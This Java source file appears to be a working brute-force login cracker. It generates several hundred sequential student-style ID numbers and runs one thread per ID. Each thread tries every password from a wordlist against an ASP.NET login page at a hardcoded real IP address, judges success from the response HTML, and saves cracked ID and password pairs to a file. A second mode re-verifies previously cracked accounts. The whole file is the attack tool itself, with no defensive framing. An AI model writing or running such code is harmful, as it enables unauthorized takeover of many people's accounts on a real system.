package z;

import java.io.*;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CountDownLatch;

public class sW implements Runnable {
    private static CountDownLatch latch;
    private static BufferedWriter bw;

    static {
        try {
            bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File("/home/zhc/po.txt"), true), "GBK"));
        } catch (IOException e) {
            ExceptionMessage(e);
        }
    }

    private Thread t;
    private String un;


    private sW(String username) {
        this.un = username;
    }

    private sW() {
    }

    public static void main(String[] args) {
        if (args.length > 0 && args[0].equals("l")) {
            new sW().l();
            return;
        }
        //        c = 49 + 47 + 48 + 47 + 49 + 48 * 2;
        List<String> l = new ArrayList<>();
        for (int i = 1; i <= 49; i++) {
            l.add(String.valueOf(201811000L + i));
        }
        for (int i = 1; i <= 47; i++) {
            l.add(String.valueOf(201812000L + i));
        }
        for (int i = 1; i <= 48; i++) {
            l.add(String.valueOf(201813000L + i));
        }
        for (int i = 1; i <= 47; i++) {
            l.add(String.valueOf(201814000L + i));
        }
        for (int i = 1; i <= 49; i++) {
            l.add(String.valueOf(201815000L + i));
        }
        for (int i = 1; i <= 48; i++) {
            l.add(String.valueOf(201816000L + i));
        }
        for (int i = 1; i <= 48; i++) {
            l.add(String.valueOf(201817000L + i));
        }
        //2017
        for (int i = 1; i <= 53; i++) {
            l.add(String.valueOf(201711000L + i));
        }
        for (int i = 1; i <= 54; i++) {
            l.add(String.valueOf(201712000L + i));
        }
        for (int i = 1; i <= 53; i++) {
            l.add(String.valueOf(201713000L + i));
        }
        for (int i = 1; i <= 51; i++) {
            l.add(String.valueOf(201714000L + i));
        }
        for (int i = 1; i <= 55; i++) {
            l.add(String.valueOf(201715000L + i));
        }

        String[] un = l.toArray(new String[0]);
        int c = un.length;
        latch = new CountDownLatch(c);
        for (String z : un) {
            System.out.println("check: \n" +
                    z + "\n");
        }
        System.out.println("length: " + un.length);
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
            ExceptionMessage(e);
        }
        for (String u : un) {
            new sW(u).S();
        }
        try {
            latch.await();
        } catch (InterruptedException e) {
            ExceptionMessage(e);
        }
        System.out.println("End");
        try {
            bw.close();
        } catch (IOException e) {
            ExceptionMessage(e);
        }
    }

    private static String getW(String un, String pw) {
        return String.format("http://218.4.55.34/index.aspx?__VIEWSTATE=%%2FwEPDwUKMTgxNjY0ODgxMQ9kFgICAw9kFgwCBw8PZBYCHgdvbkNsaWNrBRRyZXR1cm4gZG91YmxlQ2hlY2soKWQCEw8PFgIeBFRleHQFEuOAjuS4quS6uuaooeW8j%%2BOAj2RkAhcPDxYCHwEFDjEyMS4yMjguMTQzLjUxZGQCGQ8PFgIfAQUOMTIxLjIyOC4xNDMuNTFkZAIbDw8WAh8BBQEyZGQCHQ8PFgIfAQVFSVDvvJow5q%%2Br56eSJm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A75Li75py65ZCN77yaNDUxNi4yNTgz5q%%2Br56eSJm5ic3A7ZGRk9TN2nqVqAray6rvtDmUFIqCzYnk%%3D&__VIEWSTATEGENERATOR=90059987&__EVENTVALIDATION=%%2FwEWBALC9IzwDQKYpfGYCALw08i7DQLi44fLCYlDMeFb3XmDRKa9vXxoRnUpFc52&TextBoxuser=%s&TextBoxpwd=%s&Btnlogin=%%E7%%99%%BB%%E5%%BD%%95"
                , un, pw);
    }

    private static boolean Login(String un, String pw) {
        boolean b = false;
        int fT = 0;
        try {
            InputStream is = null;
            while (true) {
                try {
                    is = new URL(getW(un, pw)).openStream();
                    break;
                } catch (Exception e) {
                    System.out.println("openStream failed. " + fT + " " + e.toString());
                    System.out.println("reconnecting...");
                    try {
                        Thread.sleep(10000);
                    } catch (InterruptedException ex) {
                        ex.printStackTrace();
                    }
                    fT++;
                    if (fT >= 16) {
                        System.out.println("failed, stop trying");
                        ExceptionMessage(new Exception("3-time connecting failed " + e.toString()));
                        break;
                    }
                }
            }
            if (is == null) return false;
            InputStreamReader isr = new InputStreamReader(is, StandardCharsets.UTF_8);
            BufferedReader br = new BufferedReader(isr);
            String r = br.readLine();
            while (r != null) {
                if (r.matches(".*<span id=\"Labelmsg\"><font face=\"Arial\" color=\"Red\" size=\"3\"></font></span>.*")) {
                    b = true;
                    break;
                }
                r = br.readLine();
            }
        } catch (IOException e) {
            ExceptionMessage(e);
        }
        return b;
    }

    private static void ExceptionMessage(Exception e) {
        e.printStackTrace();
//        JOptionPane.showMessageDialog(null, e.toString(), "Exception", JOptionPane.ERROR_MESSAGE);
    }

    /*private static void OkJOP(String TitleContent) {
        System.out.println("OK!" + TitleContent);
        JOptionPane.showMessageDialog(null, "OK! " + TitleContent, "OK", JOptionPane.INFORMATION_MESSAGE);
    }*/

    @Override
    public void run() {
        try {
            BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream("/home/zhc/p.txt")));
//            71900
            for (long i = 0; i < 9999999999999999L; i++) {
                String rPW;
                String r = br.readLine();
                if (r != null) {
                    rPW = r;
                } else break;
                if (i % 50 == 0) {
                    String cLog = Thread.currentThread().getName() + " Login... " + this.un + " " + rPW;
                    System.out.println(cLog);
                }
                if (Login(this.un, rPW)) {
//                    bw.write("OK!" + this.un + "  " + rPW + "\r\n");
                    bw.write(this.un + "\t" + rPW + "\r\n");
                    bw.flush();
//                    OkJOP(this.un + "  " + rPW);
                    System.out.println("OK!" + this.un + "  " + rPW);
                }
            }
            Thread.sleep(50);
            latch.countDown();
        } catch (IOException | InterruptedException e) {
            ExceptionMessage(e);
        }
    }

    private void S() {
        if (t == null) {
            t = new Thread(this);
            t.start();
        }
    }

    private void l() {
        try {
            BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream("C:\\zhc\\Login218Log.txt")));
            String r = br.readLine();
            while (true) {
                if (r != null) {
                    final String[] ss = r.split("\\t");
                    final String finalR = r;
                    new Thread(() -> System.out.println(finalR + ": " + Login(ss[0], ss[1]))).start();
                    r = br.readLine();
                } else break;
            }
        } catch (IOException e) {
            ExceptionMessage(e);
        }
    }
}